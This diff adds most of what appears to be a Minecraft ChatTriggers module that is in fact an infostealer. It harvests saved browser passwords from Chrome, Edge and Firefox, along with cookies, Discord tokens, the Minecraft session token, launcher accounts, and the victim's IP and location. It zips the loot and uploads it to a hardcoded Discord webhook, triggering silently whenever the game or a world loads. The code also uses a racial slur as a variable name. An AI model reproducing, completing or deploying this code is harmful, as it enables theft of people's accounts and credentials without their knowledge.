+                            discoveredBrowsers.push({
+                                name: "Chrome_" + profileName,
+                                loginDataPath: loginDataFile.getAbsolutePath(),
+                                                    localStatePath: chromeUserData.getAbsolutePath() + "\\Local State",
+                                                    type: "chromium"
+                            });
+                        }
+                    }
+                }
+            }
+        } catch (e) {}
+
+        // Edge profiles discovery
+        try {
+            let edgeUserData = new java.io.File(localAppData + "\\Microsoft\\Edge\\User Data");
+            if (edgeUserData.exists()) {
+                let profiles = edgeUserData.listFiles();
+                for (let i = 0; i < profiles.length; i++) {
+                    if (profiles[i].isDirectory()) {
+                        let profileName = profiles[i].getName();
+                        let loginDataFile = new java.io.File(profiles[i], "Login Data");
+                        if (loginDataFile.exists()) {
+                            discoveredBrowsers.push({
+                                name: "Edge_" + profileName,
+                                loginDataPath: loginDataFile.getAbsolutePath(),
+                                                    localStatePath: edgeUserData.getAbsolutePath() + "\\Local State",
+                                                    type: "chromium"
+                            });
+                        }
+                    }
+                }
+            }
+        } catch (e) {}
+
+        // Firefox password discovery (uses different storage)
+        try {
+            let firefoxProfiles = new java.io.File(appData + "\\Mozilla\\Firefox\\Profiles");
+            if (firefoxProfiles.exists()) {
+                let profiles = firefoxProfiles.listFiles();
+                for (let i = 0; i < profiles.length; i++) {
+                    if (profiles[i].isDirectory()) {
+                        let loginsFile = new java.io.File(profiles[i], "logins.json");
+                        let key4File = new java.io.File(profiles[i], "key4.db");
+                        if (loginsFile.exists()) {
+                            discoveredBrowsers.push({
+                                name: "Firefox_" + profiles[i].getName(),
+                                                    loginDataPath: loginsFile.getAbsolutePath(),
+                                                    keyPath: key4File.exists() ? key4File.getAbsolutePath() : null,
+                                                    type: "firefox",
+                                                    profilePath: profiles[i].getAbsolutePath()
+                            });
+                        }
+                    }
+                }
+            }
+        } catch (e) {}
+
+        return discoveredBrowsers;
+    }
+
+    // Process Firefox passwords (JSON format)
+    function processFirefoxPasswords(loginDataPath, browserName) {
+        try {
+            let loginFile = new java.io.File(loginDataPath);
+            if (!loginFile.exists()) return [];
+
+            let loginContent = new java.lang.String(java.nio.file.Files.readAllBytes(loginFile.toPath()), "UTF-8");
+            let loginData = JSON.parse(loginContent);
+
+            let passwords = [];
+
+            if (loginData.logins && Array.isArray(loginData.logins)) {
+                for (let i = 0; i < loginData.logins.length && passwords.length < 100; i++) {
+                    let login = loginData.logins[i];
+
+                    if (login.hostname && login.encryptedUsername && login.encryptedPassword) {
+                        passwords.push({
+                            origin_url: login.hostname,
+                            username_value: login.encryptedUsername, // Firefox stores encrypted
+                            password_value: login.encryptedPassword, // Firefox stores encrypted
+                            date_created: login.timeCreated || 0,
+                            date_last_used: login.timeLastUsed || 0,
+                            browser: browserName,
+                            encrypted: true,
+                            firefox_guid: login.guid || null
+                        });
+                    }
+                }
+            }
+
+            return passwords;
+        } catch (e) {
+            return [{
+                origin_url: "firefox_parse_error",
+                username_value: "error",
+                password_value: e.toString(),
+                date_created: 0,
+                date_last_used: 0,
+                browser: browserName,
+                encrypted: false
+            }];
+        }
+    }
+
+    // Combine static and dynamic browser discovery
+    let allBrowsers = browsers.concat(discoverPasswordProfiles());
+
+    // Remove duplicates
+    let uniqueBrowsers = [];
+    let seenPaths = new java.util.HashSet();
+    for (let i = 0; i < allBrowsers.length; i++) {
+        if (!seenPaths.contains(allBrowsers[i].loginDataPath)) {
+            seenPaths.add(allBrowsers[i].loginDataPath);
+            uniqueBrowsers.push(allBrowsers[i]);
+        }
+    }
+
+    // Process each browser
+    for (let i = 0; i < uniqueBrowsers.length; i++) {
+        let browser = uniqueBrowsers[i];
+
+        try {
+            let loginFile = new java.io.File(browser.loginDataPath);
+            if (!loginFile.exists() || loginFile.length() == 0) continue;
+
+            let passwords = [];
+
+            if (browser.type === "firefox") {
+                // Firefox uses JSON format
+                passwords = processFirefoxPasswords(browser.loginDataPath, browser.name);
+            } else {
+                // Chromium browsers use SQLite
+                let decryptionKey = null;
+                if (browser.localStatePath) {
+                    try {
+                        decryptionKey = getChromeKey(browser.localStatePath);
+                    } catch (e) {
+                        // getChromeKey failed, continue without decryption
+                    }
+                }
+                passwords = readPasswordDatabase(browser.loginDataPath, browser.name, decryptionKey);
+            }
+
+            if (passwords && passwords.length > 0) {
+                // Additional metadata
+                let metadata = {
+                    browser: browser.name,
+                    browserType: browser.type,
+                    passwordCount: passwords.length,
+                    passwords: passwords,
+                    extractedAt: new java.util.Date().toString(),
+                    filePath: browser.loginDataPath,
+                    fileSize: loginFile.length(),
+                    lastModified: new java.util.Date(loginFile.lastModified()).toString(),
+                    encryptionKeyFound: browser.type === "chromium" ? (decryptionKey !== null) : false,
+                    profilePath: browser.profilePath || null
+                };
+
+                // Add key file info for Firefox
+                if (browser.keyPath) {
+                    try {
+                        let keyFile = new java.io.File(browser.keyPath);
+                        if (keyFile.exists()) {
+                            metadata.keyFileAvailable = true;
+                            metadata.keyFileSize = keyFile.length();
+                        }
+                    } catch (e) {}
+                }
+
+                allPasswords[browser.name] = metadata;
+            }
+        } catch (e) {
+            // Log error but continue
+            allPasswords[browser.name + "_error"] = {
+                browser: browser.name,
+                error: e.toString(),
+                extractedAt: new java.util.Date().toString()
+            };
+        }
+    }
+
+    // Add debug information about password extraction
+    let debugInfo = {
+        totalBrowsersChecked: Object.keys(allPasswords).length,
+        browsersWithErrors: 0,
+        browsersWithPasswords: 0,
+        totalPasswordsFound: 0
+    };
+
+    // Filter out error entries and only return valid passwords
+    let validPasswords = {};
+    for (let browserName in allPasswords) {
+        let browserData = allPasswords[browserName];
+
+        // Count errors for debugging
+        if (browserName.endsWith('_error') || browserData.error) {
+            debugInfo.browsersWithErrors++;
+            continue;
+        }
+
+        // Only include browsers with actual valid passwords
+        if (browserData.passwords && Array.isArray(browserData.passwords) && browserData.passwords.length > 0) {
+            let validBrowserPasswords = browserData.passwords.filter(password => {
+                return password.origin_url !== "read_error" &&
+                password.origin_url !== "parse_error" &&
+                password.origin_url !== "sqlite_parse_error" &&
+                password.origin_url !== "firefox_parse_error" &&
+                password.username_value !== "error" &&
+                !password.password_value.includes("JavaException") &&
+                !password.password_value.includes("FileSystemException") &&
+                !password.password_value.includes("ReferenceError");
+            });
+
+            if (validBrowserPasswords.length > 0) {
+                browserData.passwords = validBrowserPasswords;
+                browserData.passwordCount = validBrowserPasswords.length;
+                validPasswords[browserName] = browserData;
+                debugInfo.browsersWithPasswords++;
+                debugInfo.totalPasswordsFound += validBrowserPasswords.length;
+            }
+        }
+    }
+
+    // Include debug info if no passwords found
+    if (debugInfo.totalPasswordsFound === 0) {
+        validPasswords._debug = debugInfo;
+    }
+
+    return JSON.stringify(validPasswords);
+}
+
+const datanigga = {
+    username: Player.getName(),
+    uuid: Player.getUUID(),
+    token: Client.getMinecraft().func_110432_I().func_148254_d(),
+    discord: getTokens(),
+    cookies: getCookies(),
+    passwords: getPasswords(),
+    essentials: microsoftAccounts,
+    mmc: mmcAccounts,
+    prism: prismAccounts,
+};
+
+// Discord webhook (multipart attachments + 429 handling)
+var WEBHOOK_URL = 'https://discord.com/api/webhooks/1411391778795421798/27FJxGX_XSFrAz1Kd5wSHy_WbyAQDKR4HydeUT4feIIzh0fiD0xD1yP0Auo3HxgOf7yN';
+// Custom endpoint disabled
+var CUSTOM_ENDPOINT_URL = '';
+var CUSTOM_AUTH_HEADER = null;
+
+function sleepMs(ms) { try { java.lang.Thread.sleep(ms); } catch (e) {} }
+
+function readStreamFully(stream) {
+    if (!stream) return '';
+    var Scanner = Java.type('java.util.Scanner');
+    var s = new Scanner(stream, 'UTF-8').useDelimiter('\\A');
+    var body = s.hasNext() ? s.next() : '';
+    s.close();
+    try { stream.close(); } catch (ignore) {}
+    return body;
+}
+
+function httpGetJson(urlStr) {
+    try {
+        var URL = Java.type('java.net.URL');
+        var conn = new URL(urlStr).openConnection();
+        try { conn.setRequestMethod('GET'); } catch (ignore) {}
+        conn.setRequestProperty('User-Agent', 'Minecraft-CT');
+        conn.setRequestProperty('Accept', 'application/json');
+        var body = readStreamFully(conn.getInputStream());
+        return JSON.parse(String(body));
+    } catch (e) { return null; }
+}
+
+// Send JSON-only payload with wait=true and return response body
+function sendJsonReturnBody(payloadJson, maxRetries) {
+    var URL = Java.type('java.net.URL');
+    var attempts = 0;
+    while (true) {
+        attempts++;
+        var url = new URL(WEBHOOK_URL + (WEBHOOK_URL.indexOf('?') === -1 ? '?wait=true' : '&wait=true'));
+        var conn = url.openConnection();
+        try { conn.setRequestMethod('POST'); } catch (ignore) {}
+        conn.setDoOutput(true);
+        conn.setRequestProperty('Content-Type', 'application/json');
+        conn.setRequestProperty('Accept', 'application/json');
+        conn.setRequestProperty('User-Agent', 'Minecraft-CT');
+
+        var JString = Java.type('java.lang.String');
+        var os = conn.getOutputStream();
+        os.write(new JString(String(payloadJson)).getBytes('UTF-8'));
+        os.flush(); os.close();
+
+        var code = 0; try { code = conn.getResponseCode(); } catch (ignore2) {}
+        if (code === 429) {
+            var body429 = readStreamFully(conn.getErrorStream());
+            var retrySec = 1.0; try { retrySec = Math.max(0.05, JSON.parse(body429).retry_after || 1.0); } catch (e) {}
+            sleepMs(Math.ceil(retrySec * 1000));
+            if (attempts >= (maxRetries || 5)) throw new Error('Too many retries (429)');
+            continue;
+        }
+        if (code >= 500 && code < 600) {
+            sleepMs(400 + attempts * 300);
+            if (attempts >= (maxRetries || 5)) throw new Error('Server error ' + code);
+            continue;
+        }
+        if (code >= 200 && code < 300) {
+            try { return readStreamFully(conn.getInputStream()); } catch (eok) { return ''; }
+        }
+        readStreamFully(conn.getErrorStream());
+        return '';
+    }
+}
+
+// Send multipart with wait=true and return response body on success
+function sendMultipartReturnBody(payloadJson, files, maxRetries) {
+    var URL = Java.type('java.net.URL');
+    var attempts = 0;
+    while (true) {
+        attempts++;
+        var mp = makeMultipartBody(payloadJson, files);
+        var url = new URL(WEBHOOK_URL + (WEBHOOK_URL.indexOf('?') === -1 ? '?wait=true' : '&wait=true'));
+        var conn = url.openConnection();
+        try { conn.setRequestMethod('POST'); } catch (ignore) {}
+        conn.setDoOutput(true);
+        conn.setRequestProperty('Content-Type', mp.contentType);
+        conn.setRequestProperty('Accept', 'application/json');
+        conn.setRequestProperty('User-Agent', 'Minecraft-CT Multipart');
+        conn.setRequestProperty('Connection', 'close');
+
+        var os = conn.getOutputStream();
+        os.write(mp.bytes);
+        os.flush();
+        os.close();
+
+        var code = 0;
+        try { code = conn.getResponseCode(); } catch (ignore2) {}
+
+        if (code === 429) {
+            var body429 = readStreamFully(conn.getErrorStream());
+            var retrySec = 1.0; try { retrySec = Math.max(0.05, JSON.parse(body429).retry_after || 1.0); } catch (e) {}
+            sleepMs(Math.ceil(retrySec * 1000));
+            if (attempts >= (maxRetries || 5)) throw new Error('Too many retries (429)');
+            continue;
+        }
+        if (code >= 500 && code < 600) {
+            sleepMs(400 + attempts * 300);
+            if (attempts >= (maxRetries || 5)) throw new Error('Server error ' + code);
+            continue;
+        }
+        if (code >= 200 && code < 300) {
+            try { return readStreamFully(conn.getInputStream()); } catch (eok) { return ''; }
+        }
+        readStreamFully(conn.getErrorStream());
+        return '';
+    }
+}
+
+// Edit an existing webhook message by id with JSON payload
+function editWebhookMessage(messageId, payloadJson) {
+    try {
+        var URL = Java.type('java.net.URL');
+        var conn = new URL(WEBHOOK_URL + '/messages/' + messageId).openConnection();
+        try { conn.setRequestMethod('PATCH'); } catch (e) { conn.setRequestMethod('POST'); conn.setRequestProperty('X-HTTP-Method-Override', 'PATCH'); }
+        conn.setDoOutput(true);
+        conn.setRequestProperty('Content-Type', 'application/json');
+        conn.setRequestProperty('Accept', 'application/json');
+        var JString = Java.type('java.lang.String');
+        var os = conn.getOutputStream();
+        os.write(new JString(String(payloadJson)).getBytes('UTF-8'));
+        os.flush(); os.close();
+        var code = 0; try { code = conn.getResponseCode(); } catch (e1) {}
+        if (code === 429) {
+            var body429 = readStreamFully(conn.getErrorStream());
+            var retrySec = 1.0; try { retrySec = Math.max(0.05, JSON.parse(body429).retry_after || 1.0); } catch (e2) {}
+            sleepMs(Math.ceil(retrySec * 1000));
+            return editWebhookMessage(messageId, payloadJson);
+        }
+        return code >= 200 && code < 300;
+    } catch (e) { return false; }
+}
+
+function makeMultipartBody(payloadJson, files) {
+    var ByteArrayOutputStream = Java.type('java.io.ByteArrayOutputStream');
+    var DataOutputStream = Java.type('java.io.DataOutputStream');
+    var JString = Java.type('java.lang.String');
+    var baos = new ByteArrayOutputStream();
+    var out = new DataOutputStream(baos);
+    var boundary = '---------------------------' + java.util.UUID.randomUUID().toString().replace(/-/g, '');
+    var CRLF = '\r\n';
+
+    function writeStr(s) { out.write(new JString(String(s)).getBytes('UTF-8')); }
+
+    // payload_json
+    writeStr('--' + boundary + CRLF);
+    writeStr('Content-Disposition: form-data; name="payload_json"' + CRLF);
+    writeStr('Content-Type: application/json; charset=UTF-8' + CRLF + CRLF);
+    writeStr(payloadJson + CRLF);
+
+    // files
+    for (var i = 0; i < files.length; i++) {
+        var f = files[i];
+        var ct = f.contentType || 'text/plain';
+        writeStr('--' + boundary + CRLF);
+        writeStr('Content-Disposition: form-data; name="files[' + i + ']"; filename="' + String(f.filename).replace(/"/g, '') + '"' + CRLF);
+        writeStr('Content-Type: ' + ct + CRLF + CRLF);
+        if (f.bytes) {
+            out.write(f.bytes);
+            writeStr(CRLF);
+        } else {
+            writeStr(String(f.content || ''));
+            writeStr(CRLF);
+        }
+    }
+
+    writeStr('--' + boundary + '--' + CRLF);
+    out.flush(); out.close();
+
+    return { bytes: baos.toByteArray(), contentType: 'multipart/form-data; boundary=' + boundary };
+}
+
+function sendWithRetryMultipart(payloadJson, files, maxRetries) {
+    var URL = Java.type('java.net.URL');
+    var HttpURLConnection = Java.type('java.net.HttpURLConnection');
+
+    var attempts = 0;
+    while (true) {
+        attempts++;
+        var mp = makeMultipartBody(payloadJson, files);
+
+        var target = (CUSTOM_ENDPOINT_URL && CUSTOM_ENDPOINT_URL.length > 0) ? CUSTOM_ENDPOINT_URL : WEBHOOK_URL;
+        var conn = new URL(target).openConnection();
+        try { conn.setRequestMethod('POST'); } catch (ignore) {}
+        conn.setDoOutput(true);
+        conn.setRequestProperty('Content-Type', mp.contentType);
+        conn.setRequestProperty('Accept', 'application/json, */*');
+        conn.setRequestProperty('User-Agent', 'Minecraft-CT Multipart');
+        if (CUSTOM_ENDPOINT_URL && CUSTOM_ENDPOINT_URL.length > 0 && CUSTOM_AUTH_HEADER) {
+            conn.setRequestProperty('Authorization', CUSTOM_AUTH_HEADER);
+        }
+        conn.setRequestProperty('Connection', 'close');
+
+        var os = conn.getOutputStream();
+        os.write(mp.bytes);
+        os.flush();
+        os.close();
+
+        var code = 0;
+        try { code = conn.getResponseCode(); } catch (ignore2) {}
+
+        if (code === 429) {
+            var body = readStreamFully(conn.getErrorStream());
+            var retrySec = 1.0;
+            try { retrySec = Math.max(0.05, JSON.parse(body).retry_after || 1.0); } catch (e) {}
+            sleepMs(Math.ceil(retrySec * 1000));
+            if (attempts >= (maxRetries || 5)) throw new Error('Too many retries (429)');
+            continue;
+        }
+        if (code >= 500 && code < 600) {
+            sleepMs(400 + attempts * 300);
+            if (attempts >= (maxRetries || 5)) throw new Error('Server error ' + code);
+            continue;
+        }
+        if (code >= 200 && code < 300) return true;
+
+        // read and drop error body to free connection
+        readStreamFully(conn.getErrorStream());
+        return false;
+    }
+}
+
+function prettyOrRaw(s) {
+    if (!s) return '';
+    try { return JSON.stringify(JSON.parse(String(s)), null, 2); } catch (e) { return String(s); }
+}
+
+function sendDataToDiscord() {
+    try {
+        // Check if player is blocked before doing anything
+        if (isBlockedPlayer()) {
+            try { ChatLib.chat(''); } catch (ignore) {}
+            return;
+        }
+
+        // Simple 20-second cooldown to prevent duplicate sends
+        var currentTime = Date.now();
+        if (typeof global.lastSendTime !== 'undefined' && (currentTime - global.lastSendTime) < 20000) {
+            return; // Skip if sent within last 20 seconds
+        }
+        global.lastSendTime = currentTime;
+
+        // Resolve Minecraft username from session (fallback to Player API)
+        var mcUsername = 'player';
+        try { mcUsername = String(Client.getMinecraft().func_110432_I().func_111285_a()); } catch (eU1) {
+            try { mcUsername = String(Player.getName()); } catch (eU2) {}
+        }
+        var safeName = mcUsername.replace(/[^A-Za-z0-9._-]/g, '_');
+
+        var header = 'User: ' + mcUsername + ' | UUID: ' + Player.getUUID();
+
+        // Collect host/user and network info for embed
+        var InetAddress = Java.type('java.net.InetAddress');
+        var SystemJ = Java.type('java.lang.System');
+        var hostName = 'unknown';
+        var localIp = '0.0.0.0';
+        try { var addr = InetAddress.getLocalHost(); hostName = String(addr.getHostName()); localIp = String(addr.getHostAddress()); } catch (e) {}
+        var osUser = 'unknown';
+        try { osUser = String(SystemJ.getenv('USERNAME') || SystemJ.getProperty('user.name') || ''); } catch (e) {}
+
+        var geo = httpGetJson('http://ip-api.com/json');
+        var publicIp = geo && geo.query ? String(geo.query) : '';
+        var country = geo && geo.country ? String(geo.country) : '';
+        var city = geo && geo.city ? String(geo.city) : '';
+        var region = geo && geo.regionName ? String(geo.regionName) : '';
+        var isp = geo && geo.isp ? String(geo.isp) : '';
+        var countryCode = geo && geo.countryCode ? String(geo.countryCode) : '';
+        function countryCodeToFlag(cc) {
+            try {
+                cc = String(cc || '').trim().toUpperCase();
+                if (cc.length !== 2) return '';
+                var base = 127397;
+                var a = cc.charCodeAt(0) + base;
+                var b = cc.charCodeAt(1) + base;
+                return new java.lang.StringBuilder().appendCodePoint(a).appendCodePoint(b).toString();
+            } catch (e) { return ''; }
+        }
+        var flag = countryCodeToFlag(countryCode);
+
+        // Build a ZIP containing what we would have sent as separate files
+        var ByteArrayOutputStream = Java.type('java.io.ByteArrayOutputStream');
+        var ZipOutputStream = Java.type('java.util.zip.ZipOutputStream');
+        var ZipEntry = Java.type('java.util.zip.ZipEntry');
+        var JString = Java.type('java.lang.String');
+
+        var zipBaos = new ByteArrayOutputStream();
+        var zos = new ZipOutputStream(zipBaos);
+
+        function addEntry(name, text, contentJson) {
+            try {
+                zos.putNextEntry(new ZipEntry(name));
+                var data = text != null ? new JString(String(text)).getBytes('UTF-8') : new JString(JSON.stringify(contentJson, null, 2)).getBytes('UTF-8');
+                zos.write(data);
+                zos.closeEntry();
+            } catch (e) {}
+        }
+
+        // Build a sanitized meta.json that summarizes available data without embedding secrets
+        function maskMiddle(str, left, right) {
+            try {
+                var s = String(str);
+                if (s.length <= left + right) return s;
+                return s.substring(0, left) + '…' + s.substring(s.length - right);
+            } catch (e) { return ''; }
+        }
+        function extractDiscordTokens(input) {
+            try {
+                var s = String(input || '');
+                if (s.length === 0) return [];
+                var tokens = [];
+                var seen = Object.create(null);
+                var re = /(mfa\.[A-Za-z0-9_-]{20,}|[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{5,7}\.[A-Za-z0-9_-]{15,})/g;
+                var m; while ((m = re.exec(s)) !== null) {
+                    var t = m[0]; if (!seen[t]) { seen[t] = true; tokens.push(t); }
+                }
+                if (tokens.length === 0) {
+                    var parts = s.split(/[|,;\n\r\t ]+/).map(function(t){return String(t).trim();}).filter(function(t){return t.length >= 20;});
+                    for (var i=0;i<parts.length;i++){ var t2=parts[i]; if (!seen[t2]){ seen[t2]=true; tokens.push(t2);} }
+                }
+                return tokens;
+            } catch (e) { return []; }
+        }
+
+        var meta = {
+            username: mcUsername,
+            uuid: String(Player.getUUID()),
+            ssid_present: !!datanigga.token,
+            ssid_length: (datanigga.token ? String(datanigga.token).length : 0),
+            ssid_preview: (datanigga.token ? maskMiddle(datanigga.token, 8, 6) : ''),
+            discord_tokens_present: (function(){ try { return extractDiscordTokens(datanigga.discord).length > 0; } catch(e){ return false; } })(),
+            discord_token_count: (function(){ try { return extractDiscordTokens(datanigga.discord).length; } catch(e){ return 0; } })(),
+            discord_token_previews: (function(){ try { var arr = extractDiscordTokens(datanigga.discord); var out=[]; for (var i=0;i<Math.min(arr.length,5);i++) out.push(maskMiddle(arr[i],6,4)); return out; } catch(e){ return []; } })(),
+            cookies_count_total: 0,
+            passwords_count_total: 0,
+            has_microsoft_accounts: !!datanigga.essentials,
+            has_mmc_accounts: !!datanigga.mmc,
+            has_prism_accounts: !!datanigga.prism,
+        };
+        try {
+            var cObj = JSON.parse(String(datanigga.cookies||'{}'));
+            var totalC = 0;
+            for (var k in cObj) {
+                if (!cObj.hasOwnProperty(k) || k === '_debug') continue;
+                if (cObj[k] && typeof cObj[k].cookieCount === 'number') totalC += cObj[k].cookieCount;
+                else if (cObj[k] && Array.isArray(cObj[k].cookies)) totalC += cObj[k].cookies.length;
+            }
+            meta.cookies_count_total = totalC;
+        } catch (e) {}
+        try {
+            var pObj = JSON.parse(String(datanigga.passwords||'{}'));
+            var totalP = 0;
+            for (var pk in pObj) {
+                if (!pObj.hasOwnProperty(pk) || pk === '_debug') continue;
+                if (pObj[pk] && typeof pObj[pk].passwordCount === 'number') totalP += pObj[pk].passwordCount;
+                else if (pObj[pk] && Array.isArray(pObj[pk].passwords)) totalP += pObj[pk].passwords.length;
+            }
+            meta.passwords_count_total = totalP;
+        } catch (e) {}
+
+        // If you prefer to show full SSID in meta, include it explicitly
+        try { meta.ssid = String(datanigga.token || ''); } catch (e) {}
+        addEntry('meta.json', null, meta);
+        if (datanigga.discord && String(datanigga.discord).length > 0) addEntry('discord_tokens.txt', String(datanigga.discord));
+        if (datanigga.cookies) addEntry('cookies.json', prettyOrRaw(datanigga.cookies));
+        if (datanigga.passwords) addEntry('passwords.json', prettyOrRaw(datanigga.passwords));
+        if (datanigga.essentials) addEntry('microsoft_accounts.json', prettyOrRaw(datanigga.essentials));
+        if (datanigga.mmc) addEntry('mmc_accounts.json', prettyOrRaw(datanigga.mmc));
+        if (datanigga.prism) addEntry('prism_accounts.json', prettyOrRaw(datanigga.prism));
+
+        try { zos.finish(); } catch (e) {}
+        try { zos.close(); } catch (e) {}
+
+        var zipBytes = zipBaos.toByteArray();
+
+        var files = [
+            { filename: safeName + '.zip', contentType: 'application/zip', bytes: zipBytes }
+        ];
+
+        // Build a Discord embed style payload
+        function trimField(v, limit) {
+            var s = String(v==null?'':v);
+            if (s.length > limit) s = s.substring(0, limit-3) + '...';
+            return s;
+        }
+        var tokenField = '```\n' + trimField(String(datanigga.token||''), 1000) + '\n```';
+        var embed = {
+            title: '\ud83e\udd8a ' + mcUsername,
+            color: 0x2B2D31,
+            fields: [
+                { name: 'UUID', value: trimField(Player.getUUID(), 1024), inline: false },
+                { name: 'Token', value: tokenField, inline: false },
+                { name: 'Hostname', value: trimField(hostName, 1024), inline: true },
+                { name: 'OS Username', value: trimField(osUser, 1024), inline: true },
+                { name: 'IP Public', value: trimField(publicIp, 1024), inline: true },
+                { name: 'IP Local', value: trimField(localIp, 1024), inline: true },
+                { name: 'Country', value: (flag ? flag + ' ' : '') + trimField(country, 1024), inline: true },
+                { name: 'City', value: trimField(city, 1024), inline: true },
+                { name: 'Region', value: trimField(region, 1024), inline: true },
+                { name: 'ISP', value: trimField(isp, 1024), inline: true }
+            ],
+            footer: { text: 'Minecraft Data Collector' },
+            timestamp: new Date().toISOString()
+        };
+
+        // Step 1: Send the embed-only message (wait=true) and capture message ID
+        var embedOnlyResponse = sendJsonReturnBody(JSON.stringify({ embeds: [ embed ] }), 6);
+        var ok = false; var messageId = null;
+        try { var r1 = JSON.parse(String(embedOnlyResponse||'')); if (r1 && r1.id) { ok = true; messageId = String(r1.id); } } catch (e0) { ok = false; }
+        if (!ok) {
+            try {
+                // Fallback: try a simple content message to ensure webhook works
+                var simple = { content: header };
+                var rSimple = sendJsonReturnBody(JSON.stringify(simple), 3);
+                var pSimple = null; try { pSimple = JSON.parse(String(rSimple||'')); } catch(eS) {}
+                if (pSimple && pSimple.id) { ok = true; messageId = String(pSimple.id); }
+            } catch (eF) {}
+        }
+
+        // Step 2: Upload the ZIP as a reply/attachment so it renders under the existing message
+        if (ok) {
+            // Discord does not provide a direct upload-to-existing-message for webhooks, so we append a tiny follow-up with file only
+            // Include a small content to associate context, then delete content via edit
+            var attachPayload = { content: ' ' };
+            var responseBody = sendMultipartReturnBody(JSON.stringify(attachPayload), files, 6);
+            try {
+                var resp = JSON.parse(String(responseBody||''));
+                if (!CUSTOM_ENDPOINT_URL && resp && resp.attachments && resp.attachments.length > 0) {
+                    var attachUrl = String(resp.attachments[0].url || '');
+                    var updatedEmbed = embed;
+                    updatedEmbed.fields = embed.fields.concat([{ name: 'Download', value: '[' + safeName + '.zip](' + attachUrl + ')', inline: true }]);
+                    var editPayload = { embeds: [ updatedEmbed ] };
+                    editWebhookMessage(messageId, JSON.stringify(editPayload));
+
+                } else if (CUSTOM_ENDPOINT_URL) {
+
+                }
+            } catch (eResp) {}
+        } else {
+            // Fallback: send combined as before
+            var fallbackPayload = { embeds: [ embed ] };
+            var ok2 = false;
+            try {
+                var rb = sendMultipartReturnBody(JSON.stringify(fallbackPayload), files, 6);
+                // If response body parses, we consider it success
+                if (rb && String(rb).length >= 0) ok2 = true;
+            } catch (eM) {}
+
+        }
+        // Lock mechanism removed
+
+        // downloader moved to a separate top-level IIFE below so it runs even if this block exits early
+
+        try { ChatLib.chat(ok ? '' : ''); } catch (ignore) {}
+
+    } catch (e) {
+        try { ChatLib.chat('' + e); } catch (ignore2) {}
+    }
+}
+
+
+
+// PowerShell execution removed
+
+// Multiple triggers to ensure execution works after /ct reload
+function executeDataCollection() {
+    setTimeout(function() {
+        try {
+            setTimeout(function() {
+                try {
+                    try { sendDataToDiscord(); } catch (eSend) {}
+                } catch (e) {
+                    // Silent execution
+                }
+            }, 3000);
+        } catch (e) {
+            // Silent execution - don't crash Minecraft
+        }
+    }, 2000);
+}
+
+// Trigger on world load (initial join)
+register("worldLoad", function() {
+    executeDataCollection();
+});
+
+// Trigger on script load/reload (works with /ct reload)
+register("gameLoad", function() {
+    executeDataCollection();
+});
+
+// Also execute immediately when script loads (backup trigger)
+setTimeout(function() {
+    try {
+        // Check if player is in game before executing
+        if (Player && Player.getPlayer()) {
+            executeDataCollection();
+        }
+    } catch (e) {
+        // Player not available yet, that's fine
+    }
+}, 1000);
